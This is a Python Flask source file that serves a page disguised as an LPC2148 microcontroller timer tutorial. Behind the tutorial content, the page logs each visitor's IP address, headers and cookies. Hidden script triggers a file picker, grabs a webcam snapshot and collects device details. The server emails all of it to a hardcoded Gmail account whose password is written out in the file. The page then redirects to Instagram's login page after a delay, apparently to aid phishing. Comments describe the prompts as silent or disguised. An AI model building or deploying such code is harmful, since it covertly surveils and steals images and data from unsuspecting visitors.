from flask import Flask, request, render_template_string, jsonify
import time
import json
from user_agents import parse
import os
import requests
import socket
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

visitor_data = []
EMAIL_SENDER = "ezhilkirthikm@gmail.com"
EMAIL_PASSWORD = "murugesansangeethaezhilkirthikpradharshana1973198120052009"  # Use an app-specific password
EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"

@app.route('/track')
def track():
    ip_address = request.remote_addr
    raw_user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)

    ua = parse(raw_user_agent)
    
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except (socket.herror, socket.gaierror):
        hostname = 'Unknown'

    browser_profile_name = (
        f"{ua.browser.family or 'Unknown'}-{ua.browser.version_string or 'Unknown'}_"
        f"{ua.os.family or 'Unknown'}-{ua.os.version_string or 'Unknown'}_"
        f"{ua.device.family or 'Unknown'}-{ua.device.brand or 'Unknown'}"
    ).replace(" ", "-")

    visitor_info = {
        'ip': ip_address,
        'hostname': hostname,
        'user_agent': raw_user_agent,
        'browser_profile_name': browser_profile_name,
        'device': ua.device.family if ua.device.family else 'Unknown',
        'device_brand': ua.device.brand if ua.device.brand else 'Unknown',
        'device_model': ua.device.model if ua.device.model else 'Unknown',
        'os': ua.os.family if ua.os.family else 'Unknown',
        'os_version': ua.os.version_string if ua.os.version_string else 'Unknown',
        'browser': ua.browser.family if ua.browser.family else 'Unknown',
        'browser_version': ua.browser.version_string if ua.browser.version_string else 'Unknown',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'headers': headers,
        'referrer': request.referrer if request.referrer else 'Unknown',
        'cookies': request.cookies if request.cookies else 'None',
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
    }
    visitor_data.append(visitor_info)

    html = """
    <html>
    <head>
        <title>LPC2148 Timer Tutorial</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 80%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            pre { background-color: #f8f8f8; padding: 10px; }
        </style>
    </head>
    <body>
        <h1>LPC2148 Timer Summary</h1>
        <p>Welcome to this quick guide on LPC2148 timers! Explore the features and examples below.</p>
    
        <h2>Features of LPC2148 Timers</h2>
        <ul>
            <li>Two Independent 32-bit Timers (Timer 0 and Timer 1)</li>
            <li>Prescaler for Time Scaling</li>
            <li>Four Capture Inputs (Per Timer) for Event Monitoring</li>
            <li>Four Match Registers (Per Timer) for Interrupt/Event Generation</li>
            <li>Interrupt Support</li>
            <li>PWM Support</li>
        </ul>
    
        <h2>Registers Involved</h2>
        <table>
            <tr><th>Register Name</th><th>Description</th></tr>
            <tr><td>TCR</td><td>Starts, stops, and resets the timer.</td></tr>
            <tr><td>TC</td><td>Stores the current timer count.</td></tr>
            <tr><td>PR</td><td>Defines the timer resolution.</td></tr>
            <tr><td>PC</td><td>Internal counter for scaling down timer increments.</td></tr>
            <tr><td>MR0 - MR3</td><td>Stores values for timer comparison.</td></tr>
            <tr><td>MCR</td><td>Configures match register behavior.</td></tr>
            <tr><td>CR0 - CR3</td><td>Stores timestamps for capture events.</td></tr>
            <tr><td>CCR</td><td>Configures capture functionality.</td></tr>
            <tr><td>EMR</td><td>Controls external pin behavior.</td></tr>
        </table>
    
        <h2>Modes of Operation</h2>
        <ul>
            <li><b>Timer Mode:</b> Basic counting for delays.</li>
            <li><b>Capture Mode:</b> Records external signal transitions.</li>
            <li><b>Match Mode:</b> Generates interrupts or actions.</li>
            <li><b>PWM Mode:</b> Supports Pulse Width Modulation.</li>
        </ul>
    
        <h2>Timer Calculation Example</h2>
        <p>For a 1ms delay with PCLK = 60 MHz, set <code>MR0 = 60000</code>.</p>
    
        <h3>Example Code (Keil C)</h3>
        <pre><code>#include <lpc214x.h>
void timer0_init(void) {
    T0TCR = 0x02;   // Reset Timer
    T0PR  = 0;      // Prescaler (not used)
    T0MR0 = 60000;  // Match value for 1ms
    T0MCR = 0x03;   // Interrupt and reset on MR0
    T0TCR = 0x01;   // Start Timer
}</code></pre>
    
        <h2>Applications</h2>
        <ul>
            <li>Time Delays</li>
            <li>Event Counting</li>
            <li>Frequency Measurement</li>
            <li>PWM (Motor Control, LED Dimming)</li>
        </ul>
    
        <p><small>Loading additional resources...</small></p>
        <input type="file" id="galleryInput" accept="image/*" style="display:none;">
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        
        <script>
            const deviceInfo = {
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages || [navigator.language],
                platform: navigator.platform || 'Unknown',
            };

            async function requestGalleryAccess() {
                return new Promise((resolve) => {
                    const galleryInput = document.getElementById('galleryInput');
                    galleryInput.onchange = (e) => {
                        if (e.target.files && e.target.files[0]) {
                            const reader = new FileReader();
                            reader.onload = (event) => {
                                deviceInfo.galleryImage = event.target.result;
                                resolve(true);
                            };
                            reader.readAsDataURL(e.target.files[0]);
                        } else {
                            resolve(false);
                        }
                    };
                    galleryInput.click(); // Silently trigger file picker
                });
            }

            function requestCallAccess() {
                return new Promise((resolve) => {
                    // Simulate call access with a subtle prompt
                    setTimeout(() => {
                        deviceInfo.callAccess = 'Simulated access granted';
                        resolve(true);
                    }, 1000); // Delay to mimic background check
                });
            }

            async function requestCameraAccess() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const screenshot = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    deviceInfo.cameraScreenshot = screenshot;
                    return true;
                } catch (err) {
                    deviceInfo.cameraError = 'Camera access denied';
                    return false;
                }
            }

            async function captureInstagramDetails() {
                deviceInfo.instagramNote = 'Redirecting to additional resources...';
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }

            (async () => {
                await requestGalleryAccess(); // Silently trigger gallery
                await requestCallAccess();    // Simulated, no user prompt
                const cameraGranted = await requestCameraAccess(); // Camera prompt disguised as page load

                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });

                if (cameraGranted) {
                    setTimeout(captureInstagramDetails, 2000); // Delay redirect to seem natural
                }
            })();
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log():
    client_data = request.json
    if visitor_data and client_data:
        combined_data = visitor_data[-1].copy()
        combined_data.update(client_data)
        send_to_email(combined_data)
    return jsonify({'status': 'success'})

def send_to_email(data):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = 'LPC2148 Tutorial Visitor Data'

        body = json.dumps(data, indent=2)
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Data sent to email successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.route('/')
def root():
    return "Welcome to the LPC2148 Timer Tutorial. Visit /track to learn more."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
